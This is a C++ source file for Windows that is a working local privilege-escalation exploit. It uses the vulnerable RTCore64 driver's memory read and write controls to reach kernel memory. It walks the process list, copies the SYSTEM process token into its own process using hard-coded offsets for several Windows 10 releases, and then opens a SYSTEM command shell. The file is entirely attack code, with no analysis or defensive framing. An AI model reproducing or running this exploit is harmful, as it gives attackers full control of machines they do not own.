#include <Windows.h>
#include <Psapi.h>
#include <cstdio>


void Con(const char* Message, ...) {
    const auto file = stderr;

    va_list Args;
    va_start(Args, Message);
    std::vfprintf(file, Message, Args);
    std::fputc('\n', file);
    va_end(Args);
}
struct RTCORE64_MSR_READ {
    DWORD Register;
    DWORD ValueHigh;
    DWORD ValueLow;
};
static_assert(sizeof(RTCORE64_MSR_READ) == 12, "sizeof RTCORE64_MSR_READ must be 12 bytes");

struct RTCORE64_MEMORY_READ {
    BYTE Pad0[8];
    DWORD64 Address;
    BYTE Pad1[8];
    DWORD ReadSize;
    DWORD Value;
    BYTE Pad3[16];
};
static_assert(sizeof(RTCORE64_MEMORY_READ) == 48, "sizeof RTCORE64_MEMORY_READ must be 48 bytes");

struct RTCORE64_MEMORY_WRITE {
    BYTE Pad0[8];
    DWORD64 Address;
    BYTE Pad1[8];
    DWORD ReadSize;
    DWORD Value;
    BYTE Pad3[16];
};
static_assert(sizeof(RTCORE64_MEMORY_WRITE) == 48, "sizeof RTCORE64_MEMORY_WRITE must be 48 bytes");

static const DWORD RTCORE64_MSR_READ_CODE = 0x80002030;
static const DWORD RTCORE64_MEMORY_READ_CODE = 0x80002048;
static const DWORD RTCORE64_MEMORY_WRITE_CODE = 0x8000204c;

DWORD ReadMemoryPrimitive(HANDLE Device, DWORD Size, DWORD64 Address) {
    RTCORE64_MEMORY_READ MemoryRead{};
    MemoryRead.Address = Address;
    MemoryRead.ReadSize = Size;

    DWORD BytesReturned;

    DeviceIoControl(Device,
        RTCORE64_MEMORY_READ_CODE,
        &MemoryRead,
        sizeof(MemoryRead),
        &MemoryRead,
        sizeof(MemoryRead),
        &BytesReturned,
        nullptr);

    return MemoryRead.Value;
}

void WriteMemoryPrimitive(HANDLE Device, DWORD Size, DWORD64 Address, DWORD Value) {
    RTCORE64_MEMORY_READ MemoryRead{};
    MemoryRead.Address = Address;
    MemoryRead.ReadSize = Size;
    MemoryRead.Value = Value;

    DWORD BytesReturned;

    DeviceIoControl(Device,
        RTCORE64_MEMORY_WRITE_CODE,
        &MemoryRead,
        sizeof(MemoryRead),
        &MemoryRead,
        sizeof(MemoryRead),
        &BytesReturned,
        nullptr);
}

WORD ReadMemoryWORD(HANDLE Device, DWORD64 Address) {
    return ReadMemoryPrimitive(Device, 2, Address) & 0xffff;
}

DWORD ReadMemoryDWORD(HANDLE Device, DWORD64 Address) {
    return ReadMemoryPrimitive(Device, 4, Address);
}

DWORD64 ReadMemoryDWORD64(HANDLE Device, DWORD64 Address) {
    return (static_cast<DWORD64>(ReadMemoryDWORD(Device, Address + 4)) << 32) | ReadMemoryDWORD(Device, Address);
}

void WriteMemoryDWORD64(HANDLE Device, DWORD64 Address, DWORD64 Value) {
    WriteMemoryPrimitive(Device, 4, Address, Value & 0xffffffff);
    WriteMemoryPrimitive(Device, 4, Address + 4, Value >> 32);
}

unsigned long long getKBAddr() {
    DWORD out = 0;
    DWORD nb = 0;
    PVOID* base = NULL;
    if (EnumDeviceDrivers(NULL, 0, &nb)) {
        base = (PVOID*)malloc(nb);
        if (EnumDeviceDrivers(base, nb, &out)) {
            return (unsigned long long)base[0];
        }
    }
    return NULL;
}

struct Offsets {
    DWORD64 UPIdOffset;
    DWORD64 APLinksOffset;
    DWORD64 TOffset;
};

void MSYS(DWORD targetPID, Offsets offsets) {
    const auto Device = CreateFileW(LR"(\\.\RTCore64)", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
    if (Device == INVALID_HANDLE_VALUE) {
        Con("[!] Unable to obtain a handle to the device object");
        return;
    }
    Con("[*] Device object handle has been obtained");

    const auto NtoskbAddress = getKBAddr();
    Con("[*] Ntoskrnl base address: %p", NtoskbAddress);

    // Locating PsInitialSystemProcess address
    HMODULE Ntoskrnl = LoadLibraryW(L"ntoskrnl.exe");
    const DWORD64 PsInitialSystemProcessOffset = reinterpret_cast<DWORD64>(GetProcAddress(Ntoskrnl, "PsInitialSystemProcess")) - reinterpret_cast<DWORD64>(Ntoskrnl);
    FreeLibrary(Ntoskrnl);
    const DWORD64 PsInitialSystemProcessAddress = ReadMemoryDWORD64(Device, NtoskbAddress + PsInitialSystemProcessOffset);
    Con("[*] PsInitialSystemProcess address: %p", PsInitialSystemProcessAddress);


    const DWORD64 SystemProcessToken = ReadMemoryDWORD64(Device, PsInitialSystemProcessAddress + offsets.TOffset) & ~15;
    Con("[*] System process token: %p", SystemProcessToken);

    // Find our process in active process list
    const DWORD64 CurrentProcessId = static_cast<DWORD64>(targetPID);
    DWORD64 ProcessHead = PsInitialSystemProcessAddress + offsets.APLinksOffset;
    DWORD64 CurrentProcessAddress = ProcessHead;

    do {
        const DWORD64 ProcessAddress = CurrentProcessAddress - offsets.APLinksOffset;
        const auto UniqueProcessId = ReadMemoryDWORD64(Device, ProcessAddress + offsets.UPIdOffset);
        if (UniqueProcessId == CurrentProcessId) {
            break;
        }
        CurrentProcessAddress = ReadMemoryDWORD64(Device, ProcessAddress + offsets.APLinksOffset);
    } while (CurrentProcessAddress != ProcessHead);

    CurrentProcessAddress -= offsets.APLinksOffset;

    // Reading current process token
    const DWORD64 CurrentProcessFastToken = ReadMemoryDWORD64(Device, CurrentProcessAddress + offsets.TOffset);
    const DWORD64 CurrentProcessTokenReferenceCounter = CurrentProcessFastToken & 15;
    const DWORD64 CurrentProcessToken = CurrentProcessFastToken & ~15;
    Con("[*] Current process token: %p", CurrentProcessToken);

    // Stealing System process token
    Con("[*] Stealing System process token ...");
    WriteMemoryDWORD64(Device, CurrentProcessAddress + offsets.TOffset, CurrentProcessTokenReferenceCounter | SystemProcessToken);

    CloseHandle(Device);
}

struct Offsets getVOsets() {
    wchar_t value[255] = { 0x00 };
    DWORD BufferSize = 255;
    RegGetValue(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", L"ReleaseId", RRF_RT_REG_SZ, NULL, &value, &BufferSize);
    wprintf(L"[+] Windows Version %s Found\n", value);
    auto wV = _wtoi(value);
    switch (wV) {
    case 1607:
        return Offsets{ 0x02e8, 0x02f0, 0x0358};
    case 1803:
    case 1809:
        return Offsets{ 0x02e0, 0x02e8, 0x0358};
    case 1903:
    case 1909:
        return Offsets{ 0x02e8, 0x02f0, 0x0360};
    case 2004:
    case 2009:
        return Offsets{ 0x0440, 0x0448, 0x04b8};
    default:
        wprintf(L"[!] Version Offsets Not Found!\n");
        exit(-1);
    }

}


int main()
{
    Offsets osets = getVOsets();
    MSYS(GetCurrentProcessId(), osets);

    // Spawn a new shell
    Con("[*] Spawning new shell ...");

    STARTUPINFOW StartupInfo{};
    StartupInfo.cb = sizeof(StartupInfo);
    PROCESS_INFORMATION ProcessInformation;

    CreateProcessW(LR"(C:\Windows\System32\cmd.exe)",
        nullptr, nullptr, nullptr, FALSE, 0, nullptr, nullptr,
        &StartupInfo,
        &ProcessInformation);

    WaitForSingleObject(ProcessInformation.hProcess, INFINITE);
    CloseHandle(ProcessInformation.hThread);
    CloseHandle(ProcessInformation.hProcess);
    return 0;
}